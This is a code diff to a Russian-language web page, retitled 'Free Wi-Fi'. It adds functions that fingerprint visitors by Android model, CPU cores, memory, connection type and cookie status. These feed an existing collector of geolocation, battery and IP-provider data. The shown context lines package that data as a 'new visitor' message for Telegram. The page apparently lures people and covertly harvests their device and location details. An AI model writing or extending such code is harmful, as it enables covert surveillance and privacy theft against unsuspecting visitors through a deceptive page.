@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Информационный ресурс</title>
+    <title>Free Wi-Fi</title>
     <style>
         body {
             margin: 0;
@@ -79,6 +79,61 @@
             }
         }
 
+        // Определение модели Android-устройства
+        function getAndroidModel() {
+            const userAgent = navigator.userAgent;
+            
+            // Популярные бренды Android
+            const brands = {
+                'samsung': 'Samsung',
+                'huawei': 'Huawei',
+                'xiaomi': 'Xiaomi',
+                'redmi': 'Redmi',
+                'poco': 'POCO',
+                'oppo': 'Oppo',
+                'vivo': 'Vivo',
+                'realme': 'Realme',
+                'oneplus': 'OnePlus',
+                'sony': 'Sony',
+                'lg': 'LG',
+                'motorola': 'Motorola',
+                'nokia': 'Nokia',
+                'htc': 'HTC',
+                'asus': 'Asus',
+                'lenovo': 'Lenovo',
+                'zte': 'ZTE',
+                'alcatel': 'Alcatel',
+                'meizu': 'Meizu',
+                'honor': 'Honor'
+            };
+            
+            // Поиск бренда в userAgent
+            for (const [key, brand] of Object.entries(brands)) {
+                if (userAgent.toLowerCase().includes(key)) {
+                    return brand;
+                }
+            }
+            
+            // Попытка определить модель по другим признакам
+            const modelMatch = userAgent.match(/Android.*;\s([a-zA-Z0-9\s\-]+)\sBuild/i);
+            if (modelMatch && modelMatch[1]) {
+                return modelMatch[1].trim();
+            }
+            
+            return "Неизвестный Android-устройство";
+        }
+
+        // Получение информации о процессоре
+        function getCPUInfo() {
+            const cores = navigator.hardwareConcurrency || "Неизвестно";
+            return `Ядер: ${cores}`;
+        }
+
+        // Получение информации о памяти
+        function getMemoryInfo() {
+            return `ОЗУ: ${(performance.memory ? (performance.memory.jsHeapSizeLimit / (1024 * 1024)).toFixed(1) : "Неизвестно")} MB`;
+        }
+
         // Сбор информации о пользователе
         async function collectUserData() {
             const [geolocation, batteryInfo] = await Promise.all([
@@ -86,16 +141,32 @@
                 getBatteryInfo()
             ]);
 
+            // Определяем тип устройства и модель
+            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            let deviceModel = "Неизвестно";
+            
+            if (/Android/i.test(navigator.userAgent)) {
+                deviceModel = getAndroidModel();
+            } else if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+                deviceModel = "Apple " + (/iPhone/i.test(navigator.userAgent) ? "iPhone" : /iPad/i.test(navigator.userAgent) ? "iPad" : "iPod");
+            }
+
             const data = {
                 "📅 Дата и время": new Date().toLocaleString('ru-RU'),
                 "🖥️ Устройство": navigator.platform,
+                "📱 Модель устройства": deviceModel,
                 "🔍 Браузер": navigator.userAgent,
                 "🖌️ Разрешение": `${screen.width}x${screen.height}`,
-                "📱 Мобильное": /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ? "Да" : "Нет",
+                "📱 Мобильное": isMobile ? "Да" : "Нет",
                 "🌍 Язык": navigator.language,
                 "⏱️ Часовой пояс": Intl.DateTimeFormat().resolvedOptions().timeZone,
                 "🔋 Батарея": batteryInfo,
-                "📍 Геолокация": geolocation
+                "📍 Геолокация": geolocation,
+                "⚙️ Процессор": getCPUInfo(),
+                "💾 Память": getMemoryInfo(),
+                "🌐 Онлайн статус": navigator.onLine ? "Онлайн" : "Офлайн",
+                "🍪 Куки включены": navigator.cookieEnabled ? "Да" : "Нет",
+                "📶 Соединение": navigator.connection ? (navigator.connection.effectiveType || "Неизвестно") : "Неизвестно"
             };
 
             // Получаем IP и дополнительную информацию
@@ -110,6 +181,7 @@
                 .then(geoData => {
                     data["🏢 Провайдер"] = geoData.org || 'Неизвестно';
                     data["🗺️ IP-геолокация"] = `${geoData.city || 'Неизвестно'}, ${geoData.country_name || 'Неизвестно'}`;
+                    data["📡 Время сервера"] = new Date().toLocaleString('ru-RU');
                     
                     // Формируем сообщение для Telegram
                     let telegramMessage = "🔔 Новый посетитель:\n";
